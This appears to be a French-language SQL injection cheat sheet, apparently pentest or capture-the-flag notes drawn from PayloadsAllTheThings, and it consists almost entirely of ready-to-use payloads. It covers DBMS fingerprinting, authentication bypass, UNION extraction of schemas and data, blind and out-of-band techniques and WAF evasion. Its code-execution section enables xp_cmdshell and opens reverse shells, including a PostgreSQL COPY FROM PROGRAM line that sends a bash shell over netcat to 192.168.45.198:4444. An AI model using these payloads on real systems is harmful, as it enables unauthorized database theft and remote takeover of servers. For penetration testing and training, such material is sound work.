
> [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)

# 1. Détecter le point d'injection

Caractères à tester :

```
'   "   ;   )   *   \
%27 %22 %23 %3B %29 %2A
%%2727  %25%27
```

# 2. Identifier le DBMS

### Par erreur (injecter `'` ou `1'`)

| DBMS                 | Message d'erreur caractéristique                                                          | Payload |
| -------------------- | ----------------------------------------------------------------------------------------- | ------- |
| MySQL                | `You have an error in your SQL syntax; ... near '' at line 1`                             | `'`     |
| PostgreSQL           | `ERROR: unterminated quoted string at or near "'"`                                        | `'`     |
| PostgreSQL           | `ERROR: syntax error at or near "1"`                                                      | `1'`    |
| Microsoft SQL Server | `Unclosed quotation mark after the character string ''.`                                  | `'`     |
| Microsoft SQL Server | `Incorrect syntax near ''.`                                                               | `'`     |
| Microsoft SQL Server | `The conversion of the varchar value to data type int resulted in an out-of-range value.` | `1'`    |
| Oracle               | `ORA-00933: SQL command not properly ended`                                               | `'`     |
| Oracle               | `ORA-01756: quoted string not properly terminated`                                        | `'`     |
| Oracle               | `ORA-00923: FROM keyword not found where expected`                                        | `1'`    |

### Par payload spécifique

| DBMS       | Payload                                           |
| ---------- | ------------------------------------------------- |
| MySQL      | `conv('a',16,2)=conv('a',16,2)`                   |
| MySQL      | `connection_id()=connection_id()`                 |
| MySQL      | `crc32('MySQL')=crc32('MySQL')`                   |
| MSSQL      | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)`       |
| MSSQL      | `@@CONNECTIONS>0`                                 |
| MSSQL      | `@@CONNECTIONS=@@CONNECTIONS`                     |
| MSSQL      | `USER_ID(1)=USER_ID(1)`                           |
| Oracle     | `ROWNUM=ROWNUM`                                   |
| Oracle     | `RAWTOHEX('AB')=RAWTOHEX('AB')`                   |
| Oracle     | `LNNVL(0=123)`                                    |
| PostgreSQL | `5::int=5`                                        |
| PostgreSQL | `5::integer=5`                                    |
| PostgreSQL | `pg_client_encoding()=pg_client_encoding()`       |
| PostgreSQL | `get_current_ts_config()=get_current_ts_config()` |
| PostgreSQL | `current_database()=current_database()`           |
| SQLite     | `sqlite_version()=sqlite_version()`               |
| SQLite     | `last_insert_rowid()=last_insert_rowid()`         |
| MSACCESS   | `val(cvar(1))=1`                                  |
| MSACCESS   | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0`               |

# 3. Authentication bypass

```sql
' OR '1'='1
' or 1=1 limit 1 --
admin'--
' OR 1=1--
```

# 4. UNION based

> Les deux `SELECT` doivent avoir le même nombre de colonnes.

**Étape 1 -  Trouver le nombre de colonnes**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY N--   -- erreur quand N dépasse le nombre de colonnes
```

**Étape 2 -  Lister les bases de données**

```sql
' UNION SELECT null, schema_name, null FROM information_schema.schemata --
```

**Étape 3 -  Lister les tables d'une base**

```sql
' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema='nom_de_la_base' --
```

**Étape 4 -  Lister les colonnes d'une table**

```sql
' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='nom_de_la_table' --
```

**Étape 5 -  Extraire les données**

```sql
' UNION SELECT null, colonne1, colonne2 FROM nom_de_la_base.nom_de_la_table --
```

# 5. Error based

```sql
-- PostgreSQL : forcer une erreur qui leak la valeur
LIMIT CAST((SELECT version()) as numeric)
-- → ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25..."
```

# 6. Blind

### Boolean based

```sql
id=1 AND 1=1 --   -- réponse normale
id=1 AND 1=2 --   -- réponse différente / vide

id=1 AND LENGTH(@@hostname)=8 --
id=1 AND ASCII(SUBSTRING(@@hostname,1,1))=104 --
```

### Time based

```sql
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
id=1 AND IF(SUBSTRING(VERSION(),1,1)='5', BENCHMARK(1000000,MD5(1)), 0) --
```

### Out of Band (DNS)

```sql
-- MySQL
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

-- MSSQL
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

# 7. Stacked queries

```sql
1; EXEC xp_cmdshell('whoami') --
```

# 8. Code execution / Reverse shell

### PostgreSQL

```sql
';DROP TABLE IF EXISTS commandexec;CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/bash 192.168.45.198 4444'; --
```

### MSSQL

Activer `xp_cmdshell` :

```sql
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

Vérifier la connectivité :

```sql
'; EXEC xp_cmdshell 'ping 192.168.45.198'; --
```

Reverse shell :

```sql
'; EXEC xp_cmdshell 'powershell -e <BASE64>'; --
```

Chercher un flag :

```sql
'; EXEC xp_cmdshell 'dir C:\ /s /b 2>nul | findstr /i "flag"'; --
```

# 9. WAF Bypass

### Espaces alternatifs

```
%09  %0A  %0B  %0C  %0D  %A0
?id=1%09and%091=1%09--
```

### Commentaires

```sql
?id=1/*comment*/AND/**/1=1/**/--
?id=1/*!12345UNION*//*!12345SELECT*/1--
?id=(1)and(1)=(1)--
```

### Sans virgule

```sql
LIMIT 1 OFFSET 0                                          -- au lieu de LIMIT 0,1
SUBSTR('SQL' FROM 1 FOR 1)                                -- au lieu de SUBSTR('SQL',1,1)
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
```

### Sans égal

```sql
SUBSTRING(VERSION(),1,1) LIKE 5
SUBSTRING(VERSION(),1,1) BETWEEN 4 AND 6
SUBSTRING(VERSION(),1,1) NOT IN(4,3)
```

### Opérateurs équivalents

| Interdit | Bypass                      |
| -------- | --------------------------- |
| `AND`    | `&&`                        |
| `OR`     | `\|\|`                      |
| `=`      | `LIKE`, `REGEXP`, `BETWEEN` |
| `>`      | `NOT BETWEEN 0 AND X`       |
| `WHERE`  | `HAVING`                    |

### Polyglot

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
